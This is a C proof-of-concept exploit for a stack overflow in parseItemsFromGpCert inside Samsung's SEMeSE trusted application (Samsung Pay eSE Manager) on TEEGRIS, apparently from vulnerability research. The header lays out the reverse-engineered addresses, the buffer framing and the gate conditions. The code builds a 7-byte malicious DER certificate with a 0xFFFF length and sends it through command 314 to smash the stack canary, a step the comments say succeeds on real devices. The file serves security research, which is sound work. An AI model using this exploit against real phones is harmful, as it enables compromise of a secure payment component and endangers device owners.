/* SEMeSE — focused DER-length-overflow trigger for parseItemsFromGpCert.
 *
 * FINDING   : #1 HIGH — controlled overflow in parseItemsFromGpCert (the
 *             hand-rolled GlobalPlatform-cert TLV reader).
 * SEVERITY  : HIGH (attacker-controlled stack overflow reaching the canary).
 * CITATION  : RE/samsung_teegris/semese.md  §"Vulnerability findings" #1
 *               - parser           parseItemsFromGpCert @0x4F638        (lines 400-433)
 *               - cmd 314 caller   sem_verify_esek_certificate_chain @0x51A50 (line 173, 430)
 *               - DER length rule  0x81→u8(≤0xFF), 0x82→__rev16(u16)≤0xFFFF (lines 411-413)
 *               - the unclamped    LABEL_13 memcpy(out+off, src, v_len)  (lines 414-417)
 *               - 260-B field gap / 5388-B OUT struct / canary smash    (lines 405-406, 555-563)
 *             RE/emulation/semese.md
 *               - reachable cmds 45/46/47/303/304/314/315               (line 10)
 *               - the 7-byte trigger cert "7F 21 04 93 82 FF FF"        (lines 67-68, 90-93)
 *               - cmd 314 routes parser after unwrap+`n==296` gate @0x51EE4 (lines 98-123)
 *
 * TARGET    : SEMeSE (Samsung Pay eSE Manager), UUID
 *             00000000-0000-0000-0000-53454d655345  (ASCII tail "SEMeSE").
 *
 * WIRE (RE/samsung_teegris/semese.md lines 89-112; emulation/semese.md 54-60):
 *   param_types == 101 (0x65) == TEE_PARAM_TYPES(MEMREF_INPUT, MEMREF_OUTPUT, NONE, NONE)
 *   params[0]  REE-shared cmd buffer, exactly 92172 bytes
 *   params[1]  REE-shared rsp buffer, exactly 92172 bytes
 *   buffer layout inside params[0]:
 *       off 0       u32 cmd_id            <-- we set 314 here
 *       off 4       u32 ret (handler-filled)
 *       off 8       N bytes payload
 *       off 92168   u32 payload length    (must be < 0x16801 ≈ 90 KiB)
 *   eSEK sub-framing the cmd-314 path consumes (per semese_esek sweep, the
 *   characterization POC that proved cmd 314 enters this handler):
 *       off 8       u32 keyset_len = 8    (wrapped eSEK keyset section)
 *       off 20      u32 cert_len          (length of the GP cert that follows)
 *       off 24      <cert_len bytes>      <-- the malicious GP cert lands HERE
 *
 * CRAFTED DER (the over-long TLV that overflows; emitted by build_overflow_cert):
 *       7F 21    outer constructed tag  (GP CA-cert template; semese.md line 413)
 *       04       outer length = 4       (== the 4 inner bytes below; satisfies the
 *                                         parser's only length check, the OUTER body
 *                                         `if (v6 != a2 - v7)` — semese.md lines 420-421)
 *       93       inner value tag 0x93   (one of the unclamped arms; semese.md line 413)
 *       82       long-form length, 2 length octets follow (semese.md line 412)
 *       FF FF    length = __rev16(0xFFFF) = 0xFFFF = 65535  <-- the overflow driver
 *   => the parser's LABEL_13 `memcpy(out + field_off, &cert[v], 0xFFFF)` copies
 *      65535 attacker bytes into a 260-byte sub-field of the 5388-byte OUT struct,
 *      overrunning OUT, the v39..v59 intermediates, and the stack canary
 *      ~17 KB above (semese.md lines 555-563). 7 cert bytes is the whole trigger.
 *
 * TRIGGER   : InvokeCommand(session, 314, op) with the framing above.
 *
 * GATE / REPRO-STATUS : DEVICE-ONLY / BLOCKED-ON-UNWRAP-GATE.
 *   Per RE/emulation/semese.md lines 98-123, parseItemsFromGpCert in cmd 314 is
 *   reached at 0x51EE4 ONLY after:
 *       if ((u16)unwrapSecureObject_with_uuid(...))  return -2012;   // must be 0
 *       if (n != 296)                                 return -2012;   // must set n==296
 *   unwrapSecureObject_with_uuid delegates to TEES_UnwrapSecureObject, which the
 *   emulator stubs as a no-op (setReturnValue(0), writes neither buffer nor *n),
 *   so `n` stays 5100, `n != 296` is always true, and the handler bails -2012
 *   BEFORE the parser (sweep showed `esek.c:1216 Unwrap eSEK keyset size is
 *   correct` / ret 0xFFFFF824 = -2012; emulation/semese.md lines 72-73, 116-123).
 *   The emulator now models ASN1_get_object so the parser body is reachable past
 *   the crypto IF the secure-object unwrap gate is SOFT-PASSED (a faked-to-296
 *   TEES_UnwrapSecureObject so cmd 314/315 clear the `n==296` check and enter
 *   parseItemsFromGpCert — emulation/semese.md lines 181-187). Without that
 *   soft-pass this POC exercises the routing only; the overflow itself is a
 *   CONFIRMED-IN-BINARY static finding (decompile + this crafted trigger cert)
 *   that fires on a real device, where TEES_UnwrapSecureObject returns the real
 *   296-byte eSEK keyset.
 *
 * NB the SCP11 sibling cmd 315 (sem_verify_scp11_certificate_chain @0x52174,
 * semese.md line 174) reaches the SAME parser past the SAME unwrap gate; 314 is
 * used here as the focused, most-direct eSEK cert-chain verb.
 */
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "tee_client_api.h"
#include "repro.h"
#include <dlfcn.h>

/* params[0]/params[1] are each exactly 92172 bytes (RE/.../semese.md line 95). */
#define BUFSZ 92172

/* cmd 314 = sem_verify_esek_certificate_chain (SAK-ROOT -> eSEK cert chain),
 * the verb that routes to parseItemsFromGpCert (semese.md line 173, 430). */
#define CMD_VERIFY_ESEK_CERT_CHAIN 314u

/* Fixed offsets inside the 92172-byte cmd buffer (semese.md lines 106-112;
 * eSEK sub-framing from the semese_esek characterization POC). */
#define OFF_CMD_ID      0       /* u32 cmd_id                        */
#define OFF_KEYSET_LEN  8       /* u32 wrapped eSEK keyset length    */
#define OFF_CERT_LEN    20      /* u32 GP cert length                */
#define OFF_CERT        24      /* GP cert bytes (parser input)      */
#define OFF_PAYLOAD_LEN 92168   /* u32 payload length, must be <0x16801 */

void cleanup_shm(){
#if EMULATE
    system("ipcrm -M 0x13337 2>/dev/null");
    system("ipcrm -M 0x13338 2>/dev/null");
    system("ipcrm -M 0x13339 2>/dev/null");
    system("ipcrm -M 0x1333a 2>/dev/null");
#endif
}

/*
 * Emit the malicious GlobalPlatform certificate whose hand-rolled DER TLV
 * length field overflows parseItemsFromGpCert. Returns the cert length.
 *
 * The parser (semese.md lines 411-417) decodes each value's length with the
 * DER long form:  a leading 0x82 means "two big-endian length octets follow",
 * read as __rev16(u16) -> up to 0xFFFF, then memcpy'd with NO clamp to the
 * 260-byte destination sub-field. So a 0x82 0xFF 0xFF length on any value tag
 * drives a 65535-byte copy. We wrap it in the 7F 21 outer template the parser
 * expects, with the outer length set to the real inner byte count (4) so the
 * outer check `if (v6 != a2 - v7)` (semese.md lines 420-421) passes.
 */
static size_t build_overflow_cert(uint8_t *dst)
{
    size_t n = 0;

    /* --- outer constructed TLV: GP CA-cert template (semese.md line 413) --- */
    dst[n++] = 0x7F;            /* tag byte 1 (two-byte tag 0x7F21)            */
    dst[n++] = 0x21;            /* tag byte 2                                  */
    dst[n++] = 0x04;            /* outer length = 4  (== the 4 inner bytes;    */
                               /*   matches `v6 == a2 - v7` so the walk runs)  */

    /* --- inner value TLV with the over-long length (the overflow driver) --- */
    dst[n++] = 0x93;            /* inner value tag 0x93 (an unclamped arm)     */
    dst[n++] = 0x82;            /* DER long form: 2 length octets follow       */
    dst[n++] = 0xFF;           /* length hi byte (big-endian)                  */
    dst[n++] = 0xFF;           /* length lo byte -> __rev16 = 0xFFFF = 65535   */
                               /*   => memcpy(out+field, &cert[v], 0xFFFF)     */
                               /*      smashes the 260-B field + 5388-B OUT    */
                               /*      struct + the stack canary above it.     */

    /* Total = 7 bytes: 7F 21 04 93 82 FF FF (emulation/semese.md lines 67-68,
     * 90-93 — "a cert as short as 7F 21 04 93 82 FF FF drives a 65535-byte
     * copy"). The value bytes themselves are read OOB past this short cert,
     * which is part of the bug; we do not need to supply 65535 real bytes. */
    return n;
}

int main(int argc, char **argv)
{
    char* ta = "00000000-0000-0000-0000-53454d655345";   /* SEMeSE */
    TEEC_UUID *uuid = teegris_uuid(ta);
    uint32_t err_origin;
    TEEC_Result res;
    TEEC_Context context;
    TEEC_Session session;
    TEEC_Operation op;

    cleanup_shm();
    load_functions();

    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) { printf("InitContext failed 0x%x\n", res); exit(-1); }
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                                NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) { printf("OpenSession failed 0x%x\n", res); exit(-1); }
    printf("[poc] session opened to SEMeSE (PUBLIC login)\n");

    /* Both memrefs must be exactly 92172 bytes (semese.md line 95). */
    uint8_t* in  = (uint8_t*)allocate_param_mem(&context, BUFSZ);
    uint8_t* out = (uint8_t*)allocate_param_mem(&context, BUFSZ);
    if (!in || !out) { printf("[poc] alloc failed\n"); exit(-1); }
    memset(in, 0, BUFSZ);
    memset(out, 0, BUFSZ);

    /* Build the malicious GP cert into a scratch buffer, then frame it. */
    uint8_t cert[16];
    size_t cert_len = build_overflow_cert(cert);

    /* Lay out the cmd buffer (semese.md lines 106-112 + eSEK sub-framing). */
    *(uint32_t*)(in + OFF_CMD_ID)      = CMD_VERIFY_ESEK_CERT_CHAIN; /* off 0   */
    *(uint32_t*)(in + OFF_KEYSET_LEN)  = 8;                          /* off 8   */
    *(uint32_t*)(in + OFF_CERT_LEN)    = (uint32_t)cert_len;         /* off 20  */
    memcpy(in + OFF_CERT, cert, cert_len);                           /* off 24  */
    *(uint32_t*)(in + OFF_PAYLOAD_LEN) = 0x100;                      /* off 92168, <0x16801 */

    printf("[poc] crafted GP cert (%zu bytes), overflow TLV len = 0xFFFF:\n", cert_len);
    DumpHex(cert, cert_len, cert);

    /* op shape: param_types == 0x65 (semese.md line 92; emulation 54-60). */
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT, TEEC_MEMREF_TEMP_OUTPUT,
                                     TEEC_NONE, TEEC_NONE);
    op.params[0].tmpref.buffer = in;  op.params[0].tmpref.size = BUFSZ;
    op.params[1].tmpref.buffer = out; op.params[1].tmpref.size = BUFSZ;

    printf("[poc] >>> invoking cmd %u (sem_verify_esek_certificate_chain)\n",
           CMD_VERIFY_ESEK_CERT_CHAIN);
    res = TEEC_InvokeCommand_impl(&session, CMD_VERIFY_ESEK_CERT_CHAIN, &op, &err_origin);
    printf("[poc] <<< cmd %u returned 0x%x (%d) origin 0x%x\n",
           CMD_VERIFY_ESEK_CERT_CHAIN, res, (int)res, err_origin);
    /* On the emulator (no secure-object unwrap): expect -2012 (0xFFFFF824) at
     * the `n != 296` gate BEFORE the parser -> BLOCKED-ON-UNWRAP-GATE, unless
     * TEES_UnwrapSecureObject is soft-passed to yield n==296 (then the crafted
     * DER reaches parseItemsFromGpCert and the overflow fires). On a real
     * device the unwrap succeeds and the parser overflows. */

    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
